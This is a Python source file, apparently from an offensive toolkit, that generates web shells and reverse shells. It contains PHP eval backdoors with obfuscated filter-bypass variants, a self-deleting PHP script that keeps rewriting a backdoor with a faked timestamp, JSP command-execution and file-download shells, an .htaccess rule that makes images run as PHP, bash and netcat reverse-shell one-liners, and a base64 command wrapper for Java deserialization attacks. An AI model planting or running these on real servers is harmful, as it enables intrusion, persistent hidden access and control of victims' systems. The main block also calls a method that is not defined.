#!/usr/bin/env python
# -*- coding: utf-8 -*-

import random

# notice: $name should be a valid path which `www-data` can write file
memoryShellPHP = '''
<?php

set_time_limit(0);
ignore_user_abort(1);
unlink(__FILE__);
while (1) {
    $name = "%s";
    file_put_contents("./$name", "<?php eval(\$_POST['%s'])?>");
    system("chmod 777 $name");
    touch("./$name", mktime(20, 15, 1, 11, 28, 2016));
    usleep(100);
}
'''

jspShellWithPwd = '''
<%
if("%s".equals(request.getParameter("pwd")))
{
    java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
    int a = -1;
    byte[] b = new byte[2048];
    out.print("<pre>");
    while((a=in.read(b))!=-1)
    {
        out.println(new String(b));
    }
    out.print("</pre>");
}
%>
'''

jspShellWithIP = '''
<%
if("%s".equals(request.getRemoteAddr()))
{
    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
    int a = -1;
    byte[] b = new byte[2048];
    while((a=in.read(b))!=-1)
    {
        out.println(new String(b));
    }
}
%>
'''

jspWriteFile = '''
<%
    java.io.InputStream in = new java.net.URL(request.getParameter("u")).openStream();
    byte[] b = new byte[1024];
    java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
    int a = -1;
    while ((a = in.read(b)) != -1) {
        baos.write(b, 0, a);
    }
    new java.io.FileOutputStream(request.getParameter("f")).write(baos.toByteArray());
%>
'''

jspx = '''
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" xmlns="http://www.w3.org/1999/xhtml" xmlns:c="http://java.sun.com/jsp/jstl/core" version="2.0">
<jsp:directive.page contentType="text/html;charset=UTF-8" pageEncoding="UTF-8"/>
<jsp:directive.page import="java.util.*"/>
<jsp:directive.page import="java.io.*"/>
<jsp:scriptlet><![CDATA[

java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
int a = -1;
byte[] b = new byte[2048];
out.print("<pre>");
while((a=in.read(b))!=-1) {
    out.println(new String(b));
}

]]>
</jsp:scriptlet>
</jsp:root>
'''

# when can not upload php but can upload .htaccess
# and allow rewrite use this one
htaccessRewrite = '''
AddType application/x-httpd-php .png
php_flag engine 1
'''


class Shell(object):

    """
    Generate Shell for use
    """

    def __init__(self, stype="php"):
        super(Shell, self).__init__()
        self.stype = stype
        self.phpShells = [
            "<?php @eval($_POST['$%s'])?>",
            "<?php @eval($GLOBALS['_POST']['%s']);?>",
            # "<?php @eval($_FILE['name']);?>",
            '$k="ass"."ert"; $k(${"_PO"."ST"} ["%s"]);',
            # waf bypass
            '<?php ($_=@$_GET[2]).@$_($_POST[1])?>'
        ]

    def basic(self, pwd="a"):
        if self.stype == "php":
            return random.choice(self.phpShells) % pwd
        elif self.stype == "jsp":
            return jspShellWithPwd % pwd
        elif self.stype == "bash":
            return "not implement yet"

    def ipLimit(self, ip="127.0.0.1"):
        return jspShellWithIP % ip

    def memoryShell(self, shellname=".config.php", pwd="a"):
        return memoryShellPHP % (shellname, pwd)

    def reverse(self, ip, port):
        return [
            "bash -i >& /dev/tcp/%s/%s 0>&1" % (ip, port),
            # some version of nc not support -e
            "nc -e /bin/sh %s %s" % (ip, port),
            "/bin/sh | nc %s %s" % (ip, port),
        ]

    @staticmethod
    def b64BashCommand(command):
        # for Java Unserialize Attack
        # prevent transferred by Runtime.getRuntime().exec()
        template = 'bash -c {echo,%s}|{base64,-d}|{bash,-i}'
        return template % command.encode("base64").strip()


if __name__ == '__main__':
    s = Shell()
    print(s.reverse("127.0.0.1", "8888"))
    print(s.b64ShellCommand("ls"))
